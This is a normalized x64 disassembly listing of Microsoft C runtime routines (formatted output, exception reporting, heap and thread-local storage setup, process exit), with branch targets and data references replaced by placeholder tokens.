je r-xdata
test r13b 0x40
je r-xdata
and r13d 0xfffffff7
cmp r15d r11d
cmovg r15d r11d
mov r15d 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x40 ]
jmp r-xdata
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x58 ] r10d
mov rax [ rbp - 0x60 ]
test rax rax
je r-xdata
test r13b 0x4
je r-xdata
mov rsi rbx
mov rcx rbx
call sub_1800112a0
xor r10d r10d
bts r13d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x4c ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x4d ] al
jmp r-xdata
mov rbx [ r14 ]
cmp r15d esi
mov eax r15d
mov ecx 0x7fffffff
cmove eax ecx
add r14 0x8
test r13d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov r14d [ rsp + 0x60 ]
mov rax r8
lea rbx [ rbp + 0x1bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x48 ] ecx
bts r13d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x20
call sub_180013ff8
xor r10d r10d
mov rsi [ rsp + 0x68 ]
or r8d 0xffffffff
mov [ rsp + 0x40 ] r8d
jmp r-xdata
mov edx [ rbp - 0x58 ]
test edx edx
je r-xdata
mov eax 0x8000
test eax r13d
je r-xdata
test rbx rbx
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
test rbx rbx
mov [ rsp + 0x50 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax r14d
mov r14 [ rsp + 0x70 ]
lea rax [ rbp + 0x1bf ]
sub eax ebx
inc rbx
mov [ rsp + 0x44 ] eax
test r11d r13d
je r-xdata
mov rax [ r14 ]
add r14 0x8
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test r8d r8d
js r-xdata
mov r8 [ rsp + 0x68 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rbp + 0x1c0 ]
call sub_18001404c
xor r10d r10d
test edi edi
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx r15d
dec r15d
test ecx ecx
jg r-xdata
test eax eax
je r-xdata
mov rbx [ rw-data ]
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rsi ]
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rbp - 0x58 ]
mov r8d 0x6
dec edi
add rsi 0x2
call sub_180013fe4
xor r10d r10d
test eax eax
jne r-xdata
mov rsi [ rsp + 0x68 ]
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x60 ] eax
mov r9d 0x10
test r13b r13b
jns r-xdata
dec rbx
inc [ rsp + 0x44 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
movsx eax [ rax ]
bt r13d 0xb
jae r-xdata
jmp r-xdata
mov r8d [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x44 ] ecx
jmp r-xdata
mov [ rsp + 0x50 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x50 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x44 ] eax
sub_18000e7e4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rbp
push rdi
push r12
lea rbp [ rsp - 0x4f0 ]
sub rsp 0x5f0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4e0 ] rax
mov edi r8d
mov esi edx
mov ebx ecx
cmp ecx 0xffffffff
je r-xdata
and [ rsp + 0x70 ] 0x0
lea rcx [ rsp + 0x74 ]
xor edx edx
mov r8d 0x94
call sub_18000bd10
lea r11 [ rsp + 0x70 ]
lea rax [ rbp + 0x10 ]
lea rcx [ rbp + 0x10 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] rax
call [ RtlCaptureContext@IAT ]
mov r12 [ rbp + 0x108 ]
lea rdx [ rsp + 0x40 ]
mov rcx r12
xor r8d r8d
call RtlLookupFunctionEntry
test rax rax
je r-xdata
call sub_180012d90
mov rax [ rbp + 0x508 ]
mov [ rbp + 0x108 ] rax
lea rax [ rbp + 0x508 ]
mov [ rbp + 0xa8 ] rax
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x58 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
lea rcx [ rbp + 0x10 ]
mov r8 r12
mov [ rsp + 0x20 ] rcx
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
mov rcx [ rbp + 0x4e0 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x5f0 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
test edi edi
jne r-xdata
mov rax [ rbp + 0x508 ]
mov [ rsp + 0x70 ] esi
mov [ rsp + 0x74 ] edi
mov [ rbp - 0x80 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x48 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
mov ecx ebx
call sub_180012d90
sub_18000e964
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call [ DecodePointer@IAT ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
test rax rax
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_18000e930
int3
mov r10 [ rsp + 0x60 ]
mov [ rsp + 0x20 ] r10
call rax
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_18000e9f4
lea r9 [ rw-data ]
xor eax eax
mov rdx r9
lea r8d [ rax + 0x8 ]
cdqe
mov eax [ r9 + rax * 8 + 0x4 ]
retn
inc eax
add rdx r8
cmp eax 0x2d
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
cmp ecx 0xe
cmovbe eax r8d
retn
mov eax 0xd
retn
sub_18000ea7c
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18000f48c
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
mov ecx ebx
call sub_18000e9f4
mov [ r10 ] eax
add rsp 0x20
pop rbx
retn
lea r10 [ rax + 0x10 ]
mov [ rax ] ebx
call sub_18000f48c
lea r10 [ rw-data ]
test rax rax
je r-xdata
sub_18000eac4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
mov rbp rsp
sub rsp 0x50
xor ebx ebx
mov r12 r8
mov r13 rcx
mov rsi rdx
lea rcx [ rbp - 0x28 ]
lea r8d [ rbx + 0x28 ]
xor edx edx
mov rdi r9
mov [ rbp - 0x30 ] rbx
call sub_18000bd10
test rdi rdi
jne r-xdata
test r12 r12
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
or eax 0xffffffff
jmp r-xdata
mov r9 [ rbp + 0x48 ]
mov r8 [ rbp + 0x40 ]
mov ecx 0x7fffffff
cmp r12 rcx
mov eax r12d
mov rdx rdi
cmova eax ecx
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x18 ] 0x42
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] rsi
mov [ rbp - 0x28 ] eax
call r13
mov edi eax
test rsi rsi
je r-xdata
test rsi rsi
je r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
test eax eax
js r-xdata
cmp [ rbp - 0x28 ] ebx
mov [ rsi + r12 - 0x1 ] bl
setge bl
lea eax [ rbx - 0x2 ]
dec [ rbp - 0x28 ]
js r-xdata
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_18000dba0
cmp eax 0xffffffff
je r-xdata
mov rax [ rbp - 0x30 ]
mov [ rax ] bl
jmp r-xdata
mov eax edi
jmp r-xdata
sub_18000ebac
push rbx
sub rsp 0x30
mov rbx rcx
test r8 r8
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
test rcx rcx
je r-xdata
test rdx rdx
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r9
mov r9 r8
mov r8 rdx
mov rdx rcx
lea rcx [ sub_1800140f4 ]
call sub_18000eac4
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ rbx ] 0x0
add rsp 0x30
pop rbx
retn
call sub_18000ea3c
mov [ rax ] 0x22
jmp r-xdata
call sub_18000e9d4
or eax 0xffffffff
sub_18000ec1c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
call sub_18000ea3c
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_18000e9f4
mov [ rbx ] eax
sub_18000ec64
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
xor eax eax
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18000ec98
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
mov [ rsp + 0x30 ] 0x2
call [ HeapCreate@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x28
retn
call [ GetVersion@IAT ]
cmp al 0x6
jae r-xdata
mov eax 0x1
mov rcx [ rw-data ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
call [ HeapSetInformation@IAT ]
sub_18000ed10
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_18000ed7c
push rbx
sub rsp 0x20
call EncodePointer
mov rcx rax
mov rbx rax
call sub_18000ec5c
mov rcx rbx
call sub_18000e7dc
mov rcx rbx
call sub_180014e0c
mov rcx rbx
call sub_180014e04
mov rcx rbx
call sub_180014ba0
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_180012d70
sub_18000edc0
cmp rcx rdx
jae r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_18000edf4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test eax eax
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
sub_18000ee30
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov ebx ecx
je r-xdata
call sub_180013d24
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18000edf4
test eax eax
jne r-xdata
lea rcx [ rw-data ]
call sub_180010660
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rcx [ sub_180010124 ]
call sub_180010544
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
mov ecx ebx
call [ rw-data ]
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add rbx 0x8
call rax
xor eax eax
lea rcx [ rw-data ]
call sub_180010660
test eax eax
je r-xdata
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
sub_18000eee0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r12d r8d
mov ebx edx
mov r15d ecx
mov ecx 0x8
call sub_180012fa4
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
mov [ rw-data ] 0x1
mov ecx 0x8
call sub_180012ea4
mov ecx r15d
call sub_18000ed10
mov ecx r15d
call [ ExitProcess@IAT ]
mov ecx 0x8
call sub_180012ea4
test r12d r12d
jne r-xdata
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18000edc0
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rsi rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18000edc0
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rdi rax
mov [ rsp + 0x20 ] rax
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov r13 rax
mov [ rsp + 0x38 ] rax
call EncodePointer
cmp [ rdi ] rax
jne r-xdata
cmp rdi rsi
jb r-xdata
jmp r-xdata
mov rcx [ rdi ]
call [ DecodePointer@IAT ]
mov rbx rax
call EncodePointer
mov [ rdi ] rax
call rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
cmp r14 rbx
jne r-xdata
sub rdi 0x8
mov [ rsp + 0x20 ] rdi
cmp rdi rsi
jb r-xdata
mov r14 rbx
mov [ rsp + 0x28 ] rbx
mov rsi rbx
mov [ rsp + 0x30 ] rbx
mov r13 rax
mov [ rsp + 0x38 ] rax
mov rdi rax
mov [ rsp + 0x20 ] rax
jmp r-xdata
cmp r13 rax
je r-xdata
sub_18000f0b4
lea r8 [ r--data ]
xor eax eax
mov rdx r8
cdqe
add rax rax
mov rax [ r8 + rax * 8 + 0x8 ]
retn
inc eax
add rdx 0x10
cmp eax 0x16
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
xor eax eax
retn
sub_18000f0e0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x250
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x240 ] rax
mov edi ecx
call sub_18000f0b4
xor esi esi
mov rbx rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x240 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x250 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
lea ecx [ rsi + 0x3 ]
call sub_1800151fc
cmp eax 0x1
je r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov rdi rax
test rax rax
je r-xdata
lea ecx [ rsi + 0x3 ]
call sub_1800151fc
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov edx esi
lea r8 [ rsp + 0x40 ]
lea rbp [ rw-data ]
mov r12d 0x314
lea r8 [ r--data ]
mov rcx rbp
mov edx r12d
call sub_180015190
xor ecx ecx
test eax eax
jne r-xdata
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x233 ] sil
call sub_1800112a0
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
mov rcx rdi
mov r8 rax
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
inc edx
inc r8
add rbx 0x2
cmp edx 0x1f4
jb r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] rsi
call sub_18000e930
int3
lea r13 [ rw-data ]
mov r8d 0x104
mov [ rw-data ] si
mov rdx r13
call [ GetModuleFileNameW@IAT ]
lea edi [ r12 - 0x19 ]
test eax eax
jne r-xdata
mov cl [ rbx ]
mov [ r8 ] cl
cmp [ rbx ] si
je r-xdata
mov rcx r13
call sub_180015174
inc rax
cmp rax 0x3c
jbe r-xdata
lea r8 [ r--data ]
mov edx edi
mov rcx r13
call sub_180015190
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r12
mov rcx rbp
call sub_18001501c
test eax eax
jne r-xdata
mov rcx r13
call sub_180015174
lea r8 [ r--data ]
mov r9d 0x3
lea rcx [ rbp + rax * 2 - 0x44 ]
mov rax rcx
sub rax r13
sar rax 0x1
sub rdi rax
mov rdx rdi
call sub_1800150a4
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18000e930
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18000e930
int3
mov r8 rbx
mov rdx r12
mov rcx rbp
call sub_18001501c
test eax eax
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18000e930
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18000e930
int3
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rbp
call sub_180014e14
jmp r-xdata
sub_18000f340
sub rsp 0x28
mov ecx 0x3
call sub_1800151fc
cmp eax 0x1
je r-xdata
mov ecx 0xfc
call sub_18000f0e0
mov ecx 0xff
call sub_18000f0e0
mov ecx 0x3
call sub_1800151fc
test eax eax
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_18000f3d4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx + 0xa0 ] rax
and [ rcx + 0x10 ] 0x0
mov [ rcx + 0x1c ] 0x1
mov [ rcx + 0xc8 ] 0x1
mov [ rcx + 0x174 ] 0x43
mov [ rcx + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ rcx + 0xb8 ] rax
mov ecx 0xd
call sub_180012fa4
nop
mov rax [ rbx + 0xb8 ]
[ rax ]
mov ecx 0xd
call sub_180012ea4
mov ecx 0xc
call sub_180012fa4
nop
mov [ rbx + 0xc0 ] rdi
test rdi rdi
jne r-xdata
mov rcx [ rbx + 0xc0 ]
call sub_180010eec
nop
mov ecx 0xc
call sub_180012ea4
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov [ rbx + 0xc0 ] rax
sub_18000f48c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2c8
call sub_18000f7ac
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_18000ec1c
xor ebx ebx
xor edx edx
call sub_18000f3d4
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_18000f534
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0xa0 ]
lea rax [ r--data ]
cmp rcx rax
je r-xdata
call sub_18000ec1c
mov edi 0xd
mov ecx edi
call sub_180012fa4
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_18000ec1c
mov ecx edi
call sub_180012ea4
mov ecx 0xc
call sub_180012fa4
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ]
jne r-xdata
mov ecx 0xc
call sub_180012ea4
mov rcx rbx
call sub_18000ec1c
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_180010f78
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_18000ec1c
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_18001101c
nop
sub_18000f668
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x20
pop rbx
retn
test rbx rbx
jne r-xdata
xor edx edx
call [ FlsSetValue@IAT ]
mov rcx rbx
call sub_18000f534
call [ FlsGetValue@IAT ]
mov ecx [ rw-data ]
mov rbx rax
sub_18000f6a8
push rbx
sub rsp 0x20
call sub_18000ed7c
call sub_180012d98
test eax eax
je r-xdata
call sub_18000f3ac
xor eax eax
lea rcx [ sub_18000f534 ]
call [ FlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
mov edx 0x2c8
mov ecx 0x1
call sub_18000f7ac
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
xor edx edx
mov rcx rbx
call sub_18000f3d4
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18000f72c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov edi [ rw-data ]
xor ebp ebp
mov rsi rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test edi edi
je r-xdata
mov ecx ebp
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea r11d [ rbp + 0x3e8 ]
cmp r11d edi
mov ebp r11d
cmova ebp r12d
cmp ebp r12d
jne r-xdata
mov rcx rsi
call sub_18000c27c
mov rbx rax
test rax rax
jne r-xdata
sub_18000f7ac
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_18001523c
mov rbx rax
test rax rax
jne r-xdata
sub_18000f830
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_18000c1a8
mov rbx rax
test rax rax
jne r-xdata
sub_18000f8b8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoW@IAT ]
mov edx 0x58
lea ebp [ rdx - 0x38 ]
mov ecx ebp
call sub_18000f7ac
xor r14d r14d
mov rdx rax
test rax rax
jne r-xdata
mov [ rw-data ] rax
add rax 0xb00
mov ecx ebp
mov [ rw-data ] ecx
cmp rdx rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x62 ] r14w
je r-xdata
add rdx 0x9
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov r12d r14d
mov rbx r14
mov rax [ rsp + 0x68 ]
test rax rax
je r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x2f ] 0xa00
mov [ rdx + 0x31 ] 0xa
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rw-data ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov ecx [ rw-data ]
lea eax [ r12 - 0x1 ]
mov [ rbx + rdi + 0x8 ] 0x81
neg eax
mov eax 0xfffffff6
sbb ecx ecx
add ecx 0xfffffff5
test r12d r12d
cmove ecx eax
call [ GetStdHandle@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbx + rdi ] 0xfffffffffffffffe
je r-xdata
movsxd r12 [ rax ]
mov ebx 0x800
lea r13 [ rax + 0x4 ]
add r12 r13
cmp [ rax ] ebx
cmovl ebx [ rax ]
cmp ecx ebx
jge r-xdata
or [ rbx + rdi + 0x8 ] 0x40
mov [ rbx + rdi ] 0xfffffffffffffffe
test rax rax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x80
jmp r-xdata
mov edi r14d
test ebx ebx
jle r-xdata
lea rdi [ rw-data ]
mov rdi [ rw-data ]
cmp [ rbx + rdi ] 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
add rbx 0x58
inc r12d
cmp rbx 0x108
jl r-xdata
cmp [ r12 ] 0xffffffffffffffff
je r-xdata
mov ebx [ rw-data ]
mov edx [ rw-data ]
lea rcx [ rax + 0xb00 ]
mov [ rdi ] rax
add edx ebp
mov [ rw-data ] edx
cmp rax rcx
jae r-xdata
movzx eax al
mov [ rbx + rdi ] rbp
cmp eax 0x2
jne r-xdata
inc edi
inc r13
add r12 0x8
cmp edi ebx
jl r-xdata
cmp [ r12 ] 0xfffffffffffffffe
je r-xdata
add rdi 0x8
cmp edx ebx
jl r-xdata
lea rdx [ rax + 0x9 ]
cmp eax 0x3
jne r-xdata
or [ rbx + rdi + 0x8 ] 0x40
jmp r-xdata
test [ r13 ] 0x1
je r-xdata
mov edx 0x58
mov rcx rbp
call sub_18000f7ac
